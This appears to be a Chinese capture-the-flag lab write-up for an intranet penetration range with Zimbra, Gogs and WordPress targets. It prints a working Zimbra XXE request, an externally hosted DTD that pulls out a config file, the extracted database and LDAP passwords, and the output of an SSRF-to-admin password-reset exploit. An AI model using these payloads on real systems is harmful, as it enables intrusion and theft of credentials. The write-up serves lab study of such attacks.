# 闪电龙计划

闪电龙是一套难度为困难的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，掌握内网渗透中一些有趣的技术要点。该靶场共有 11 个 flag，分布于不同的靶机。

<!-- truncate -->

:::info

Tags

- Wordpress
- Zimbra
- SSRF
- 内网渗透

:::

| Name | Hostname | IP Address                  | Note          |
| :--- | :------- | :-------------------------- | :------------ |
|      |          | 39.99.151.70 / 172.20.1.100 | Gogs + Zimbra |
|      |          | 39.99.155.146               | Wordpress     |

| IP            | Port | Fingre       | Note                              |
| :------------ | :--- | :----------- | :-------------------------------- |
| 39.99.151.70  | 443  | Zimbra       | poc-yaml-zimbra-cve-2019-9670-xxe |
| 39.99.151.70  | 7071 | Zimbra Admin |                                   |
| 39.99.151.70  | 8081 | Gogs         |                                   |
| 39.99.151.70  | 8443 | Zimbra       | poc-yaml-zimbra-cve-2019-9670-xxe |
| 39.99.155.146 | 80   | Wordpress    |                                   |

## 入口点

```plaintext
39.99.155.146
39.99.151.70
```

## 入口点探测

直接上双扫描器做初步的扫描

```shell title="fscan -h 39.99.155.146,39.99.151.70"
[+] Memcached 39.99.151.70:11211 unauthorized
[*] WebTitle http://39.99.155.146      code:200 len:55783  title:b1ng0 &#8211; 又一个WordPress站点
[*] WebTitle http://39.99.151.70:1080  code:407 len:0      title:None
[*] WebTitle http://39.99.151.70:8081  code:302 len:34     title:None 跳转url: http://39.99.151.70:8081/user/login
[*] WebTitle https://39.99.151.70      code:200 len:12541  title:Zimbra 网络客户端登录
[*] WebTitle http://39.99.151.70:8081/user/login code:200 len:7002   title:登录 - Gogs
[+] InfoScan http://39.99.151.70:8081/user/login [Gogs简易Git服务] 
[*] WebTitle https://39.99.151.70:7071 code:302 len:0      title:None 跳转url: https://39.99.151.70:7071/zimbraAdmin
[*] WebTitle https://39.99.151.70:8443 code:200 len:12541  title:Zimbra 网络客户端登录
[+] PocScan http://39.99.151.70:8081 poc-yaml-go-pprof-leak 
[+] PocScan https://39.99.151.70:8443 poc-yaml-zimbra-cve-2019-9670-xxe 
[+] PocScan https://39.99.151.70 poc-yaml-zimbra-cve-2019-9670-xxe 
```

## 入口 39.99.155.146 Wordpress wpscan 扫描

扫描结果位于 [wordpress\_wpscan.txt](attachment/wordpress_wpscan.txt)

## 入口 39.99.151.70 Gogs Go pprof

Gogs 关闭了注册功能

完整的 Go pprof 信息存放在 [gogs-pprof](attachment/gogs-pprof/) 目录中

使用 `Deepseek v4 pro` 进行分析，得到

- 后端数据库使用的是 MSSQL
- Web Framework: Macaron v1.3.9
- DB Driver: go-mssqldb v0.0.0-20200206145737

## 入口 39.99.151.70 Zimbra XXE

参考 [zimbra 攻防笔记 - XXE+SSRF RCE – NooEmotion の摆烂屋](http://nooemotion.com/2023/02/16/zimbra%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0-xxessrf-rce/)

发出请求

```plaintext
POST /Autodiscover/Autodiscover.xml HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
Content-Type: application/xml
Host: 39.99.151.70:7071
Content-Length: 338

<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
      <EMailAddress>aaaaa</EMailAddress>
      <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
  </Autodiscover>
```

可收到

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time
Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network
Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd
Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
ntp:x:108:114::/home/ntp:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
_chrony:x:110:119:Chrony daemon,,,:/var/lib/chrony:/bin/false
zimbra:x:999:999::/opt/zimbra:/bin/bash
postfix:x:998:998::/opt/zimbra/postfix:
```

公网托管 `exp.dtd`

```xml
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

得到 [localconfig.xml](attachment/localconfig.xml)

提取核心信息

| Key                                                                                      | Value                              |
| :--------------------------------------------------------------------------------------- | :--------------------------------- |
| mailboxd\_keystore\_password | JBFCoEpT                           |
| ldap\_amavis\_password       | ZkXUdwQU                           |
| ldap\_url                                                  | ldap://mail.b1ng0-bussines.com:389 |
| ldap\_master\_url            | ldap://mail.b1ng0-bussines.com:389 |
| zimbra\_user                                               | zimbra                             |
| ldap\_replication\_password | ZkXUdwQU                           |
| ldap\_root\_password       | ZkXUdwQU                           |
| zimbra\_mysql\_password    | xcw.Lp6Q7epHKtTKoJy0LpaNk          |
| mysql\_root\_password      | jXrhKQ.Gc9fQFpVzWSTb9UXtPRHikyz    |

直接用脚本 [zimbra\_exploit.py](attachment/zimbra_exploit.py) 执行 Zimbra XXE 到 账户密码重置 流程

```plaintext
[*] Step 1 (User Token) Status: 200

[+] User ZM_AUTH_TOKEN from cookie: 0_529dbb3fce04754f31165fb1116e347e5d71044d_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313738313739303730313331353b747970653d363a7a696d6272613b753d313a613b7469643d31303a313338343633313137383b
[*] Step 2 (SSRF Elevation) Status: 200
[*] Set-Cookie: ZM_ADMIN_AUTH_TOKEN=0_c36aafe23d340e79f8b730c1c2705bcda8eb3b26_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313738313636313130313537363b61646d696e3d313a313b747970653d363a7a696d6272613b753d313a613b7469643d31303a313835373333323738333b;Path=/;Secure;HttpOnly

[+] Admin ZM_ADMIN_AUTH_TOKEN from cookie: 0_c36aafe23d340e79f8b730c1c2705bcda8eb3b26_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313738313636313130313537363b61646d696e3d313a313b747970653d363a7a696d6272613b753d313a613b7469643d31303a313835373333323738333b
[*] Step 3 Status: 200

[+] Found 7 account(s):
    [1] name=admin@mail.b1ng0-bussines.com, id=0c2b40c6-7215-445c-9b98-fe638e063b3a
    [2] name=spam.uc95b1px@mail.b1ng0-bussines.com, id=82dbde6b-92d4-4946-821d-162fe9b3c19c
    [3] name=ham.4wcek6pd@mail.b1ng0-bussines.com, id=120d906d-745a-4449-8c27-5731fb7fe9d6
    [4] name=virus-quarantine.ubjfsztvi@mail.b1ng0-bussines.com, id=71ef75c0-5d07-497e-bb0d-9d36ae3a72a7
    [5] name=galsync.yryjyuviw0@mail.b1ng0-bussines.com, id=91b09114-787e-4f6d-9ba6-53840ebe39e6
    [6] name=xinfa@mail.b1ng0-bussines.com, id=cd09e2c0-db4c-476d-b821-d119b96806f8
    [7] name=contact@mail.b1ng0-bussines.com, id=5b0e6fc9-ffbe-4b96-bc68-3d32245ac1d3

[*] Targeting account: admin@mail.b1ng0-bussines.com (id=0c2b40c6-7215-445c-9b98-fe638e063b3a)
[*] Step 4 (Reset Password) Status: 200
[*] Response:
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Header><context xmlns="urn:zimbra"/></soap:Header><soap:Body><SetPasswordResponse xmlns="urn:zimbraAdmin"/></soap:Body></soap:Envelope>

[+] Password reset successful!
    Account ID: 0c2b40c6-7215-445c-9b98-fe638e063b3a
    New Password: Admin123###
```

可以利用 `admin@mail.b1ng0-bussines.com:Admin123###` 登录后台

TODO 提权 + 反弹 shell

## 入口 172.20.1.100 网络情况

```shell title="netstat -anopt | grep :::"
tcp6       0      0 :::7780                 :::*                    LISTEN      4318/httpd       off (0.00/0/0)
tcp6       0      0 ::1:10024               :::*                    LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp6       0      0 ::1:10026               :::*                    LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp6       0      0 :::11211                :::*                    LISTEN      3796/memcached   off (0.00/0/0)
tcp6       0      0 ::1:3310                :::*                    LISTEN      4264/clamd       off (0.00/0/0)
tcp6       0      0 ::1:10032               :::*                    LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp6       0      0 :::8081                 :::*                    LISTEN      789/gost         off (0.00/0/0)
tcp6       0      0 :::1080                 :::*                    LISTEN      790/gost         off (0.00/0/0)
```

```shell title="netstat -anopt | grep 0.0.0.0"
tcp        0      0 0.0.0.0:7071            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 127.0.0.1:23232         0.0.0.0:*               LISTEN      3997/perl        off (0.00/0/0)
tcp        0      0 0.0.0.0:7072            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 127.0.0.1:23233         0.0.0.0:*               LISTEN      3999/perl        off (0.00/0/0)
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      3928/nginx.conf  off (0.00/0/0)
tcp        0      0 0.0.0.0:7073            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      3928/nginx.conf  off (0.00/0/0)
tcp        0      0 127.0.0.1:7171          0.0.0.0:*               LISTEN      1408/java        off (0.00/0/0)
tcp        0      0 172.20.1.100:389        0.0.0.0:*               LISTEN      1345/slapd       off (0.00/0/0)
tcp        0      0 0.0.0.0:7110            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 0.0.0.0:7143            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 127.0.0.1:10663         0.0.0.0:*               LISTEN      3208/zmlogger: zmrr off (0.00/0/0)
tcp        0      0 127.0.0.1:10024         0.0.0.0:*               LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp        0      0 127.0.0.1:10025         0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 127.0.0.1:10026         0.0.0.0:*               LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp        0      0 127.0.0.1:7306          0.0.0.0:*               LISTEN      3203/mysqld      off (0.00/0/0)
tcp        0      0 127.0.0.1:10027         0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 0.0.0.0:587             0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 0.0.0.0:11211           0.0.0.0:*               LISTEN      3796/memcached   off (0.00/0/0)
tcp        0      0 127.0.0.1:10028         0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 127.0.0.1:10029         0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 127.0.0.1:10030         0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 127.0.0.1:3310          0.0.0.0:*               LISTEN      4264/clamd       off (0.00/0/0)
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      3928/nginx.conf  off (0.00/0/0)
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      13567/evil2.conf off (0.00/0/0)
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      3928/nginx.conf  off (0.00/0/0)
tcp        0      0 127.0.0.1:10032         0.0.0.0:*               LISTEN      4055/amavisd (maste off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 0.0.0.0:465             0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 127.0.0.1:8465          0.0.0.0:*               LISTEN      4291/opendkim    off (0.00/0/0)
tcp        0      0 0.0.0.0:7025            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      2598/unbound     off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      910/sshd         off (0.00/0/0)
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      4519/master      off (0.00/0/0)
tcp        0      0 0.0.0.0:7993            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      3928/nginx.conf  off (0.00/0/0)
tcp        0      0 0.0.0.0:7995            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
tcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN      3287/java        off (0.00/0/0)
```

注意到 Gogs 服务实际上是内网转发出来的

```shell title="cat /proc/789/cmdline"
/usr/bin/gost -L=tcp://:8081/172.20.1.192:3000
```

```shell title="cat /proc/790/cmdline"
/usr/bin/gost -L=admin:QupH4wF7fQKs69@0.0.0.0:1080
```

## 内网 172.20.1.0/24

使用 fscan 进行扫描

```plaintext
[+] Memcached 172.20.1.100:11211 unauthorized
[*] WebTitle http://172.20.1.192:3000  code:302 len:34     title:None 跳转url: http://172.20.1.192:3000/user/login
[*] WebTitle http://172.20.1.100:8081  code:302 len:34     title:None 跳转url: http://172.20.1.100:8081/user/login
[*] WebTitle http://172.20.1.48:2375   code:404 len:29     title:None
[*] WebTitle http://172.20.1.100:1080  code:407 len:0      title:None
[*] WebTitle http://172.20.1.100:9999  code:200 len:2811   title:Index of /
[*] WebTitle http://172.20.1.192:3000/user/login code:200 len:7002   title:登录 - Gogs
[*] WebTitle http://172.20.1.100:8081/user/login code:200 len:7002   title:登录 - Gogs
[*] WebTitle http://172.20.1.204       code:200 len:23688  title:极致CMS建站系统
[*] WebTitle https://172.20.1.100:7071 code:302 len:0      title:None 跳转url: https://172.20.1.100:7071/zimbraAdmin
[*] WebTitle https://172.20.1.100:8443 code:200 len:12541  title:Zimbra 网络客户端登录
[*] WebTitle https://172.20.1.100      code:200 len:12541  title:Zimbra 网络客户端登录
[+] InfoScan http://172.20.1.192:3000/user/login [Gogs简易Git服务] 
[+] InfoScan http://172.20.1.100:8081/user/login [Gogs简易Git服务] 
[*] WebTitle https://172.20.1.100:7071/zimbraAdmin/ code:200 len:81705  title:Zimbra 管理
[*] WebTitle http://172.20.1.101       code:200 len:55768  title:b1ng0 &#8211; 又一个WordPress站点
[+] PocScan http://172.20.1.48:2375 poc-yaml-docker-api-unauthorized-rce 
[+] Redis 172.20.1.48:6379 unauthorized file:/data/dump.rdb
[+] PocScan http://172.20.1.192:3000 poc-yaml-go-pprof-leak 
[+] PocScan http://172.20.1.48:2375 poc-yaml-go-pprof-leak 
[+] PocScan http://172.20.1.100:8081 poc-yaml-go-pprof-leak 
[+] Redis 172.20.1.48:6379 like can write /root/.ssh/
[+] PocScan https://172.20.1.100:8443 poc-yaml-zimbra-cve-2019-9670-xxe 
[+] PocScan https://172.20.1.100 poc-yaml-zimbra-cve-2019-9670-xxe 
[+] PocScan https://172.20.1.100:7071 poc-yaml-zimbra-cve-2019-9670-xxe 
```

## 172.20.1.48 Redis unauthorized

## 172.20.1.48 Docker unauthorized
